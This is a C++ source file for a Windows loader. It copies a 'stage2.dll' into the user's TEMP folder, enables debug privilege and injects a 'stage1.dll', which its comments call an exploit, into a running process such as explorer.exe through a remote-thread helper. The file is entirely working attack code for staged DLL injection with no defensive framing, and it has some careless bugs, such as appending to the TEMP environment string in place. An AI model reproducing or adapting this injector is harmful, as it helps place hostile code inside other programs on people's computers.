#define _CRT_SECURE_NO_WARNINGS
#define DBG true
//Standar Headers
#include <string>
//Code for dll injection (my RemoteThread implementation) 
#include "injector.hpp"

void debug(const char *text)
{
	if (DBG)
	{
		std::cout << text << std::endl;
	}
}


int main(int argc, char *argv[])
{
	//Init variables
	DWORD targetPID;
	char source[MAX_PATH];

	debug("[>] Preparing Enviroment");
	
	//Get current path from where we're running
	GetModuleFileName(NULL, source, sizeof(source));
	strcat(source, "\\stage1.dll");
	//Append name of the stage1 dll to the path, this is not going to be copied anywhere but
	//the full path it's needed to perform the injection 
	
	
	//Resolve %TEMP% path
	char* target;
	target = getenv("TEMP");
	strcat(target, "\\stage2.dll");

	int z = CopyFile("stage2.dll", target, 0);//Copies the stage2.dll to temp so stage1 can find it / will fail if it already exists
	if (z!=0)
	{
		debug("[OK]");
	}
	else
	{
		debug("[FAIL]");
		Sleep(1000);
		exit(EXIT_FAILURE);
	}
	


	EnableDebugPrivilege(true);                //Enable SeDebugPrivilege to make everything easier (may not be needed)
	targetPID = 2900;//getPIDbyName("explorer.exe");  //Fix this to support ansi strings which is not working with current project settings

	z = RemoteThread(targetPID, source); //Inject the stage 1 exploit into it, this is too standar
	if (z != 0)
	{
		debug("[>] Loading Succesfull ");
		Sleep(1000);
		exit(EXIT_FAILURE);
	}
	else
	{
		debug("[>] Loading Failed ");
	}

	
	return 0;
}